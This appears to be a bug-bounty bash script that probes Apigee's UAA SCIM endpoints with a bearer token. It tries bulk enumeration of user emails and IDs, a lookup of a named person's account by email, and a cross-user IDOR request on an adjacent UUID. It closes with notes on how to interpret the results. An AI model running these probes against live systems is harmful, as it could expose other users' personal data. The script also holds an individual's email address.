#!/bin/bash
# Probe UAA SCIM API endpoints using edgecli Bearer token.
# Tests whether scim.emails.read + scim.ids.read scopes allow:
#   a) Bulk enumeration of all Apigee user emails/IDs
#   b) Cross-user IDOR via /Users/{other-id}
# All Apigee Edge users who authenticate via edgecli get these scopes automatically.
# Usage: export APIGEE_TOKEN="$(cat /tmp/apigee_token.txt)" && bash scripts/apigee_scim_probe.sh
export PATH="/usr/bin:/usr/local/bin:/usr/sbin:/bin:$PATH"

TOKEN="${APIGEE_TOKEN:-}"
UAA="https://login.apigee.com"
OWN_ID="80dc0e8a-f939-414c-9f9c-0b8f9699a877"

OUTDIR="$HOME/bug-bounty-hunting-/results/apigee/03-candidates"
mkdir -p "$OUTDIR"
OUT="$OUTDIR/APG-L006-scim-probe.txt"

if [ -z "$TOKEN" ]; then
  echo "ERROR: export APIGEE_TOKEN=\"\$(cat /tmp/apigee_token.txt)\" first"
  exit 1
fi

echo "=== UAA SCIM API Probe (scim.emails.read + scim.ids.read) ===" | tee "$OUT"
echo "Date: $(date -u)" | tee -a "$OUT"
echo "UAA: $UAA" | tee -a "$OUT"
echo "Own user_id: $OWN_ID" | tee -a "$OUT"
echo | tee -a "$OUT"

# --- Baseline: own profile via /Users/{id} ---
echo "--- [Baseline] GET /Users/{own_id} (scim.me — should 200) ---" | tee -a "$OUT"
/usr/bin/curl -sk --max-time 10 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Accept: application/json" \
  -w "\nHTTP_%{http_code}" \
  "${UAA}/Users/${OWN_ID}" | python3 -m json.tool 2>/dev/null | tee -a "$OUT"
echo | tee -a "$OUT"

# --- /Users bulk list (needs scim.read — should 403 with our scopes) ---
echo "--- GET /Users (full list — needs scim.read; should be 403) ---" | tee -a "$OUT"
/usr/bin/curl -sk --max-time 10 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Accept: application/json" \
  -w "\nHTTP_%{http_code}" \
  "${UAA}/Users?count=5" | tee -a "$OUT"
echo | tee -a "$OUT"

# --- /Users?attributes=emails (scim.emails.read bulk email read attempt) ---
echo "--- GET /Users?attributes=id,emails (scim.emails.read bulk enum attempt) ---" | tee -a "$OUT"
/usr/bin/curl -sk --max-time 10 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Accept: application/json" \
  -w "\nHTTP_%{http_code}" \
  "${UAA}/Users?count=10&attributes=id%2Cemails" | tee -a "$OUT"
echo | tee -a "$OUT"

# --- /Users?filter=emails.value pr (enumerate all with any email) ---
echo "--- GET /Users?filter=emails.value+pr&attributes=id,emails (presence filter) ---" | tee -a "$OUT"
/usr/bin/curl -sk --max-time 10 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Accept: application/json" \
  -w "\nHTTP_%{http_code}" \
  "${UAA}/Users?filter=emails.value+pr&count=5&attributes=id%2Cemails" | tee -a "$OUT"
echo | tee -a "$OUT"

# --- /ids/Users endpoint (designed for scim.ids.read scope) ---
echo "--- GET /ids/Users?filter=userName+pr (scim.ids.read bulk ID enumeration) ---" | tee -a "$OUT"
/usr/bin/curl -sk --max-time 10 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Accept: application/json" \
  -w "\nHTTP_%{http_code}" \
  "${UAA}/ids/Users?filter=userName+pr&count=5&attributes=id%2CuserName" | tee -a "$OUT"
echo | tee -a "$OUT"

# --- /ids/Users: look up known Apigee team member (IDOR via email lookup) ---
echo "--- GET /ids/Users?filter=userName+eq+srinandans@google.com (cross-user ID lookup) ---" | tee -a "$OUT"
/usr/bin/curl -sk --max-time 10 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Accept: application/json" \
  -w "\nHTTP_%{http_code}" \
  "${UAA}/ids/Users?filter=userName+eq+%22srinandans%40google.com%22&attributes=id%2CuserName" | tee -a "$OUT"
echo | tee -a "$OUT"

# --- Cross-user IDOR: probe a different UUID (adjacent to own) ---
# Derive an adjacent ID by incrementing the last hex digit of own ID
ADJACENT_ID="80dc0e8a-f939-414c-9f9c-0b8f9699a876"
echo "--- GET /Users/{adjacent_id} (cross-user IDOR probe) ---" | tee -a "$OUT"
echo "Probing: $ADJACENT_ID" | tee -a "$OUT"
/usr/bin/curl -sk --max-time 10 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Accept: application/json" \
  -w "\nHTTP_%{http_code}" \
  "${UAA}/Users/${ADJACENT_ID}" | tee -a "$OUT"
echo | tee -a "$OUT"

# --- /Groups: does scim.ids.read or scim.me allow reading group membership? ---
echo "--- GET /Groups (group enumeration attempt) ---" | tee -a "$OUT"
/usr/bin/curl -sk --max-time 10 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Accept: application/json" \
  -w "\nHTTP_%{http_code}" \
  "${UAA}/Groups?count=5" | tee -a "$OUT"
echo | tee -a "$OUT"

# --- /userinfo: confirms token is valid (baseline) ---
echo "--- GET /userinfo (OIDC baseline — should 200) ---" | tee -a "$OUT"
/usr/bin/curl -sk --max-time 10 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Accept: application/json" \
  -w "\nHTTP_%{http_code}" \
  "${UAA}/userinfo" | python3 -m json.tool 2>/dev/null | tee -a "$OUT"
echo | tee -a "$OUT"

echo "=== INTERPRETATION ===" | tee -a "$OUT"
echo "CRITICAL BUGS (if confirmed):" | tee -a "$OUT"
echo "  /Users?attributes=emails returns 200 with other user data:" | tee -a "$OUT"
echo "    → scim.emails.read allows bulk email enumeration → APG-L006 Medium/High" | tee -a "$OUT"
echo "  /ids/Users?filter=userName returns 200 with other user IDs:" | tee -a "$OUT"
echo "    → scim.ids.read allows bulk user ID enumeration → APG-L006 Medium" | tee -a "$OUT"
echo "  /Users/{other-id} returns 200 with profile data:" | tee -a "$OUT"
echo "    → IDOR on SCIM endpoint → APG-L006 Medium/High (links to management API IDOR)" | tee -a "$OUT"
echo | tee -a "$OUT"
echo "EXPECTED SECURE BEHAVIOR:" | tee -a "$OUT"
echo "  /Users bulk → 403 (needs scim.read)" | tee -a "$OUT"
echo "  /Users/{other-id} → 403 or 404" | tee -a "$OUT"
echo "  /ids/Users bulk → 403 or empty results" | tee -a "$OUT"
echo | tee -a "$OUT"
echo "Done. Results: $OUT"
